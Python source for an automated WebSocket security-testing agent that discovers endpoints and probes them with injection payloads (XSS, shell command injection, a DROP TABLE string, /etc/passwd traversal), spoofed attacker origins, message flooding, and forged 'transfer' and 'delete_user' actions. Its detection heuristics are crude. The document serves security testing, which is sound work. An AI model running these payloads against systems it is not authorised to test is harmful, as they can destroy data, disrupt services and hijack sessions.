"""
WebSocket Security Testing Agent
===============================

This agent performs comprehensive WebSocket security testing including:
- WebSocket authentication bypass
- Message injection attacks  
- Origin validation bypass
- Protocol manipulation
- DoS via message flooding
- Real-time communication vulnerabilities

Author: Nexus Hunter Security Team
Version: 1.0
"""

import asyncio
import aiohttp
import json
import time
import websockets
import random
import base64
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse
from ..base import BaseAgent


class WebSocketSecurityAgent(BaseAgent):
    """Advanced WebSocket Security Testing Agent"""
    
    def __init__(self):
        super().__init__("WebSocket Security Agent", "websocket_security")
        self.description = "Real-time WebSocket communication security testing"
        self.version = "1.0"
        
        # WebSocket vulnerability categories
        self.test_categories = {
            'authentication': 'WebSocket authentication bypass testing',
            'origin_validation': 'Origin header validation bypass',
            'message_injection': 'WebSocket message injection attacks',
            'protocol_manipulation': 'WebSocket protocol manipulation',
            'dos_attacks': 'Denial of service via WebSocket flooding',
            'csrf_websocket': 'Cross-Site WebSocket Hijacking',
            'data_exposure': 'Sensitive data exposure via WebSocket',
            'authorization': 'WebSocket authorization bypass'
        }
        
        # Common WebSocket endpoints and patterns
        self.websocket_patterns = [
            '/ws', '/websocket', '/socket.io', '/sockjs',
            '/api/ws', '/api/websocket', '/live', '/realtime',
            '/chat', '/notifications', '/updates', '/stream',
            '/events', '/feed', '/activity'
        ]
        
        # WebSocket protocols to test
        self.protocols = [
            'chat', 'echo', 'api', 'json', 'msgpack',
            'graphql-ws', 'graphql-transport-ws'
        ]
        
        # Malicious payloads for message injection
        self.injection_payloads = [
            # XSS payloads
            {'message': '<script>alert("XSS")</script>'},
            {'content': '"><script>alert(1)</script>'},
            {'text': 'javascript:alert("XSS")'},
            
            # Command injection
            {'command': '; ls -la'},
            {'cmd': '$(whoami)'},
            {'exec': '`id`'},
            
            # SQL injection
            {'query': "'; DROP TABLE users; --"},
            {'search': "' OR 1=1 --"},
            
            # NoSQL injection  
            {'filter': {'$where': 'function() { return true; }'}},
            
            # Template injection
            {'template': '{{7*7}}'},
            {'render': '${7*7}'},
            
            # Path traversal
            {'file': '../../../etc/passwd'},
            {'path': '..\\..\\windows\\system32\\drivers\\etc\\hosts'}
        ]

    async def execute(self, target: str, context: Dict = None) -> Dict[str, Any]:
        """Execute comprehensive WebSocket security testing"""
        results = {
            'agent': self.name,
            'version': self.version,
            'target': target,
            'timestamp': time.time(),
            'vulnerabilities': [],
            'findings': {},
            'websockets_found': [],
            'risk_score': 0,
            'test_summary': {}
        }
        
        try:
            # First discover WebSocket endpoints
            websocket_urls = await self._discover_websockets(target, results)
            
            if not websocket_urls:
                results['findings']['discovery'] = {'message': 'No WebSocket endpoints discovered'}
                results['success'] = True
                return results
            
            # Test each discovered WebSocket
            for ws_url in websocket_urls:
                await self._test_websocket_security(ws_url, results)
                await asyncio.sleep(1)  # Rate limiting between tests
                
        except Exception as e:
            results['error'] = f"WebSocket security testing failed: {str(e)}"
            results['success'] = False
            return results
        
        # Calculate final risk score
        results['risk_score'] = self._calculate_risk_score(results)
        results['success'] = True
        
        return results

    async def _discover_websockets(self, target: str, results: Dict) -> List[str]:
        """Discover WebSocket endpoints"""
        websocket_urls = []
        
        # Convert HTTP(S) to WS(S)
        parsed = urlparse(target)
        if parsed.scheme == 'https':
            ws_scheme = 'wss'
        else:
            ws_scheme = 'ws'
        
        base_ws_url = f"{ws_scheme}://{parsed.netloc}"
        
        # Test common WebSocket patterns
        for pattern in self.websocket_patterns:
            ws_url = urljoin(base_ws_url, pattern)
            
            try:
                # Quick connection test
                async with websockets.connect(
                    ws_url,
                    timeout=5,
                    ping_timeout=None,
                    close_timeout=None
                ) as websocket:
                    websocket_urls.append(ws_url)
                    results['websockets_found'].append({
                        'url': ws_url,
                        'status': 'accessible',
                        'protocol': websocket.subprotocol
                    })
                    
            except websockets.exceptions.InvalidStatusCode as e:
                if e.status_code == 401:
                    # WebSocket found but requires authentication
                    websocket_urls.append(ws_url)
                    results['websockets_found'].append({
                        'url': ws_url,
                        'status': 'requires_auth',
                        'status_code': e.status_code
                    })
            except Exception:
                # WebSocket not accessible or doesn't exist
                continue
        
        # Also check for Socket.IO endpoints via HTTP
        await self._discover_socketio_endpoints(target, results, websocket_urls)
        
        return websocket_urls

    async def _discover_socketio_endpoints(self, target: str, results: Dict, websocket_urls: List[str]) -> None:
        """Discover Socket.IO endpoints via HTTP polling"""
        socketio_paths = ['/socket.io/', '/sockjs/', '/sock/', '/ws/']
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                for path in socketio_paths:
                    test_url = urljoin(target, path)
                    
                    try:
                        async with session.get(test_url) as response:
                            if response.status == 200:
                                response_text = await response.text()
                                
                                # Check for Socket.IO indicators
                                if any(indicator in response_text.lower() for indicator in 
                                      ['socket.io', 'websocket', 'polling']):
                                    
                                    # Convert to WebSocket URL
                                    parsed = urlparse(target)
                                    ws_scheme = 'wss' if parsed.scheme == 'https' else 'ws'
                                    ws_url = f"{ws_scheme}://{parsed.netloc}{path}socket.io/"
                                    
                                    if ws_url not in websocket_urls:
                                        websocket_urls.append(ws_url)
                                        results['websockets_found'].append({
                                            'url': ws_url,
                                            'status': 'socketio_detected',
                                            'discovery_method': 'http_polling'
                                        })
                        
                    except Exception:
                        continue
                        
        except Exception:
            pass

    async def _test_websocket_security(self, ws_url: str, results: Dict) -> None:
        """Test security of a specific WebSocket endpoint"""
        
        # 1. Authentication Bypass Testing
        await self._test_authentication_bypass(ws_url, results)
        
        # 2. Origin Validation Testing  
        await self._test_origin_validation(ws_url, results)
        
        # 3. Message Injection Testing
        await self._test_message_injection(ws_url, results)
        
        # 4. Protocol Manipulation
        await self._test_protocol_manipulation(ws_url, results)
        
        # 5. DoS Testing
        await self._test_dos_attacks(ws_url, results)
        
        # 6. CSRF WebSocket Testing
        await self._test_csrf_websocket(ws_url, results)
        
        # 7. Data Exposure Testing
        await self._test_data_exposure(ws_url, results)

    async def _test_authentication_bypass(self, ws_url: str, results: Dict) -> None:
        """Test WebSocket authentication bypass vulnerabilities"""
        findings = []
        
        # Test direct connection without credentials
        try:
            async with websockets.connect(
                ws_url,
                timeout=5,
                ping_timeout=None
            ) as websocket:
                
                # Try to send messages without authentication
                test_messages = [
                    {'type': 'auth', 'token': ''},
                    {'type': 'connect'},
                    {'type': 'join', 'room': 'admin'},
                    {'action': 'authenticate', 'user': 'admin'},
                    {'cmd': 'login', 'username': 'admin', 'password': ''}
                ]
                
                for message in test_messages:
                    try:
                        await websocket.send(json.dumps(message))
                        response = await asyncio.wait_for(websocket.recv(), timeout=3)
                        
                        # Check for successful authentication indicators
                        if any(success in response.lower() for success in 
                              ['authenticated', 'welcome', 'connected', 'success', 'joined']):
                            
                            findings.append({
                                'type': 'Authentication Bypass',
                                'severity': 'CRITICAL',
                                'endpoint': ws_url,
                                'payload': message,
                                'evidence': f"Authentication bypassed: {response[:200]}",
                                'impact': 'Unauthorized access to WebSocket functionality',
                                'cwe': 'CWE-287'
                            })
                            
                    except asyncio.TimeoutError:
                        continue
                    except Exception:
                        break
                        
        except Exception:
            pass
        
        # Test with invalid tokens
        invalid_tokens = [
            'invalid_token', 'null', '', 'admin', '123456',
            'Bearer invalid', 'jwt.invalid.token'
        ]
        
        for token in invalid_tokens:
            try:
                headers = {'Authorization': f'Bearer {token}'}
                async with websockets.connect(
                    ws_url,
                    timeout=5,
                    extra_headers=headers
                ) as websocket:
                    
                    # If connection succeeds with invalid token
                    findings.append({
                        'type': 'Invalid Token Acceptance',
                        'severity': 'HIGH',
                        'endpoint': ws_url,
                        'token': token,
                        'evidence': 'WebSocket accepted invalid authentication token',
                        'impact': 'Weak authentication allows unauthorized access',
                        'cwe': 'CWE-287'
                    })
                    
            except websockets.exceptions.InvalidStatusCode:
                # Good - invalid token rejected
                continue
            except Exception:
                continue
        
        results['findings']['authentication'] = findings
        results['test_summary']['authentication'] = len(findings)

    async def _test_origin_validation(self, ws_url: str, results: Dict) -> None:
        """Test Origin header validation bypass"""
        findings = []
        
        malicious_origins = [
            'http://evil.com',
            'https://attacker.example.com', 
            'null',
            '',
            'http://localhost',
            'chrome-extension://malicious',
            'file://',
            'data:text/html,<script>alert(1)</script>'
        ]
        
        for origin in malicious_origins:
            try:
                headers = {'Origin': origin} if origin else {}
                
                async with websockets.connect(
                    ws_url,
                    timeout=5,
                    extra_headers=headers
                ) as websocket:
                    
                    # If connection succeeds with malicious origin
                    findings.append({
                        'type': 'Origin Validation Bypass',
                        'severity': 'HIGH',
                        'endpoint': ws_url,
                        'malicious_origin': origin,
                        'evidence': f'WebSocket accepted malicious origin: {origin}',
                        'impact': 'Cross-origin WebSocket hijacking possible',
                        'cwe': 'CWE-346'
                    })
                    
            except websockets.exceptions.InvalidStatusCode as e:
                if e.status_code == 403:
                    # Good - origin rejected
                    continue
            except Exception:
                continue
        
        results['findings']['origin_validation'] = findings
        results['test_summary']['origin_validation'] = len(findings)

    async def _test_message_injection(self, ws_url: str, results: Dict) -> None:
        """Test WebSocket message injection vulnerabilities"""
        findings = []
        
        try:
            async with websockets.connect(
                ws_url,
                timeout=10,
                ping_timeout=None
            ) as websocket:
                
                for payload in self.injection_payloads:
                    try:
                        # Send malicious payload
                        await websocket.send(json.dumps(payload))
                        
                        # Check for immediate response
                        try:
                            response = await asyncio.wait_for(websocket.recv(), timeout=2)
                            
                            # Check for injection indicators
                            injection_indicators = [
                                'alert(', 'javascript:', '<script',
                                'error', 'exception', 'syntax',
                                'eval(', 'document.cookie', 'window.'
                            ]
                            
                            if any(indicator in response.lower() for indicator in injection_indicators):
                                findings.append({
                                    'type': 'Message Injection',
                                    'severity': 'HIGH',
                                    'endpoint': ws_url,
                                    'payload': payload,
                                    'evidence': f'Injection response: {response[:200]}',
                                    'impact': 'Code execution or data manipulation via WebSocket',
                                    'cwe': 'CWE-79'
                                })
                                
                        except asyncio.TimeoutError:
                            # No immediate response - test for blind injection
                            test_response = {'type': 'test'}
                            await websocket.send(json.dumps(test_response))
                            
                            try:
                                delayed_response = await asyncio.wait_for(websocket.recv(), timeout=2)
                                if 'error' in delayed_response.lower():
                                    findings.append({
                                        'type': 'Blind Message Injection',
                                        'severity': 'MEDIUM',
                                        'endpoint': ws_url,
                                        'payload': payload,
                                        'evidence': 'Error in subsequent message suggests injection',
                                        'impact': 'Potential blind injection vulnerability',
                                        'cwe': 'CWE-89'
                                    })
                            except asyncio.TimeoutError:
                                pass
                                
                        await asyncio.sleep(0.5)  # Rate limiting
                        
                    except Exception:
                        continue
                        
        except Exception:
            pass
        
        results['findings']['message_injection'] = findings
        results['test_summary']['message_injection'] = len(findings)

    async def _test_protocol_manipulation(self, ws_url: str, results: Dict) -> None:
        """Test WebSocket protocol manipulation vulnerabilities"""
        findings = []
        
        # Test with different subprotocols
        for protocol in self.protocols:
            try:
                async with websockets.connect(
                    ws_url,
                    timeout=5,
                    subprotocols=[protocol]
                ) as websocket:
                    
                    # Test protocol-specific attacks
                    if protocol == 'graphql-ws':
                        # GraphQL WebSocket attacks
                        malicious_query = {
                            'type': 'start',
                            'payload': {
                                'query': 'query { __schema { types { name } } }'
                            }
                        }
                        
                        await websocket.send(json.dumps(malicious_query))
                        
                        try:
                            response = await asyncio.wait_for(websocket.recv(), timeout=3)
                            if 'schema' in response.lower():
                                findings.append({
                                    'type': 'GraphQL Schema Exposure',
                                    'severity': 'MEDIUM',
                                    'endpoint': ws_url,
                                    'protocol': protocol,
                                    'evidence': 'GraphQL schema accessible via WebSocket',
                                    'impact': 'Information disclosure of API structure',
                                    'cwe': 'CWE-200'
                                })
                        except asyncio.TimeoutError:
                            pass
            except Exception:
                continue
        
        # Test protocol upgrade attacks
        try:
            # Malicious upgrade headers
            malicious_headers = {
                'Sec-WebSocket-Protocol': 'chat, evil-protocol',
                'Sec-WebSocket-Extensions': 'malicious-extension'
            }
            
            async with websockets.connect(
                ws_url,
                timeout=5,
                extra_headers=malicious_headers
            ) as websocket:
                
                findings.append({
                    'type': 'Protocol Extension Accepted',
                    'severity': 'LOW',
                    'endpoint': ws_url,
                    'evidence': 'Malicious protocol extensions accepted',
                    'impact': 'Potential protocol manipulation vulnerability',
                    'cwe': 'CWE-345'
                })
                
        except Exception:
            pass
        
        results['findings']['protocol_manipulation'] = findings
        results['test_summary']['protocol_manipulation'] = len(findings)

    async def _test_dos_attacks(self, ws_url: str, results: Dict) -> None:
        """Test WebSocket DoS vulnerabilities"""
        findings = []
        
        try:
            async with websockets.connect(
                ws_url,
                timeout=10,
                ping_timeout=None
            ) as websocket:
                
                # Test message flooding
                start_time = time.time()
                messages_sent = 0
                
                for i in range(100):  # Send 100 rapid messages
                    try:
                        flood_message = {'flood': f'message_{i}', 'data': 'x' * 1000}
                        await websocket.send(json.dumps(flood_message))
                        messages_sent += 1
                        
                        if i % 10 == 0:  # Check every 10 messages
                            try:
                                # Try to receive response
                                await asyncio.wait_for(websocket.recv(), timeout=0.1)
                            except asyncio.TimeoutError:
                                pass
                                
                    except websockets.exceptions.ConnectionClosed:
                        # Connection closed due to flooding
                        findings.append({
                            'type': 'DoS via Message Flooding',
                            'severity': 'MEDIUM',
                            'endpoint': ws_url,
                            'evidence': f'Connection closed after {messages_sent} messages',
                            'impact': 'Service disruption through message flooding',
                            'cwe': 'CWE-400'
                        })
                        break
                    except Exception:
                        break
                
                # Test large message attack
                try:
                    large_message = {'data': 'x' * (1024 * 1024)}  # 1MB message
                    await websocket.send(json.dumps(large_message))
                    
                    # If large message accepted without error
                    findings.append({
                        'type': 'Large Message DoS',
                        'severity': 'MEDIUM',
                        'endpoint': ws_url,
                        'evidence': '1MB message accepted without size validation',
                        'impact': 'Resource exhaustion through large messages',
                        'cwe': 'CWE-770'
                    })
                    
                except Exception:
                    # Good - large message rejected
                    pass
                    
        except Exception:
            pass
        
        results['findings']['dos_attacks'] = findings
        results['test_summary']['dos_attacks'] = len(findings)

    async def _test_csrf_websocket(self, ws_url: str, results: Dict) -> None:
        """Test Cross-Site WebSocket Hijacking (CSWSH)"""
        findings = []
        
        # Test if WebSocket can be accessed from arbitrary origins
        csrf_origins = [
            'http://attacker.com',
            'https://evil.example.com'
        ]
        
        for origin in csrf_origins:
            try:
                headers = {'Origin': origin}
                
                async with websockets.connect(
                    ws_url,
                    timeout=5,
                    extra_headers=headers
                ) as websocket:
                    
                    # Try to perform sensitive actions
                    sensitive_actions = [
                        {'action': 'transfer', 'amount': 1000},
                        {'command': 'delete_user'},
                        {'type': 'admin_action'},
                        {'operation': 'sensitive_data_access'}
                    ]
                    
                    for action in sensitive_actions:
                        try:
                            await websocket.send(json.dumps(action))
                            
                            try:
                                response = await asyncio.wait_for(websocket.recv(), timeout=2)
                                
                                if any(success in response.lower() for success in 
                                      ['success', 'completed', 'done', 'ok']):
                                    
                                    findings.append({
                                        'type': 'Cross-Site WebSocket Hijacking',
                                        'severity': 'HIGH',
                                        'endpoint': ws_url,
                                        'malicious_origin': origin,
                                        'action': action,
                                        'evidence': f'Sensitive action executed from malicious origin: {response[:100]}',
                                        'impact': 'Cross-site request forgery via WebSocket',
                                        'cwe': 'CWE-352'
                                    })
                                    
                            except asyncio.TimeoutError:
                                pass
                                
                        except Exception:
                            continue
                            
            except Exception:
                continue
        
        results['findings']['csrf_websocket'] = findings
        results['test_summary']['csrf_websocket'] = len(findings)

    async def _test_data_exposure(self, ws_url: str, results: Dict) -> None:
        """Test for sensitive data exposure via WebSocket"""
        findings = []
        
        try:
            async with websockets.connect(
                ws_url,
                timeout=10,
                ping_timeout=None
            ) as websocket:
                
                # Test for automatic data broadcast
                try:
                    # Listen for automatic messages
                    response = await asyncio.wait_for(websocket.recv(), timeout=5)
                    
                    # Check for sensitive data patterns
                    sensitive_patterns = [
                        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
                        r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',  # Credit card
                        r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
                        'password', 'token', 'secret', 'key', 'api_key'
                    ]
                    
                    import re
                    for pattern in sensitive_patterns:
                        if re.search(pattern, response, re.IGNORECASE):
                            findings.append({
                                'type': 'Sensitive Data Exposure',
                                'severity': 'HIGH',
                                'endpoint': ws_url,
                                'evidence': f'Sensitive data detected in WebSocket message: {response[:100]}',
                                'pattern': pattern,
                                'impact': 'Sensitive information leaked via WebSocket',
                                'cwe': 'CWE-200'
                            })
                            break
                            
                except asyncio.TimeoutError:
                    pass
                
                # Test information gathering requests
                info_requests = [
                    {'type': 'get_users'},
                    {'action': 'list_all'},
                    {'command': 'dump_data'},
                    {'query': 'SELECT * FROM users'},
                    {'type': 'debug_info'}
                ]
                
                for request in info_requests:
                    try:
                        await websocket.send(json.dumps(request))
                        
                        try:
                            response = await asyncio.wait_for(websocket.recv(), timeout=3)
                            
                            # Check for information disclosure
                            if len(response) > 500 and any(keyword in response.lower() for keyword in 
                                                          ['user', 'admin', 'database', 'config', 'debug']):
                                
                                findings.append({
                                    'type': 'Information Disclosure',
                                    'severity': 'MEDIUM',
                                    'endpoint': ws_url,
                                    'request': request,
                                    'evidence': f'Information disclosed: {response[:200]}',
                                    'impact': 'Unauthorized information access via WebSocket',
                                    'cwe': 'CWE-200'
                                })
                                
                        except asyncio.TimeoutError:
                            pass
                            
                        await asyncio.sleep(0.5)
                        
                    except Exception:
                        continue
                        
        except Exception:
            pass
        
        results['findings']['data_exposure'] = findings
        results['test_summary']['data_exposure'] = len(findings)

    def _calculate_risk_score(self, results: Dict) -> int:
        """Calculate overall risk score based on findings"""
        score = 0
        severity_weights = {'CRITICAL': 10, 'HIGH': 7, 'MEDIUM': 4, 'LOW': 2}
        
        for category, findings in results.get('findings', {}).items():
            for finding in findings:
                severity = finding.get('severity', 'LOW')
                score += severity_weights.get(severity, 2)
        
        # Compile all vulnerabilities
        results['vulnerabilities'] = []
        for category, findings in results.get('findings', {}).items():
            results['vulnerabilities'].extend(findings)
        
        # Count critical vulnerabilities
        critical_count = sum(1 for vuln in results['vulnerabilities'] 
                           if vuln.get('severity') == 'CRITICAL')
        results['critical_vulnerabilities'] = critical_count
        
        return min(score, 100)  # Cap at 100

    def get_info(self) -> Dict[str, Any]:
        """Return agent information"""
        return {
            'name': self.name,
            'description': self.description,
            'version': self.version,
            'categories': list(self.test_categories.keys()),
            'test_types': [
                'WebSocket Authentication Bypass',
                'Origin Validation Testing',
                'Message Injection Attacks',
                'Protocol Manipulation',
                'DoS Attack Testing',
                'Cross-Site WebSocket Hijacking',
                'Sensitive Data Exposure',
                'Authorization Bypass'
            ],
            'protocols_supported': self.protocols,
            'severity_levels': ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
        }

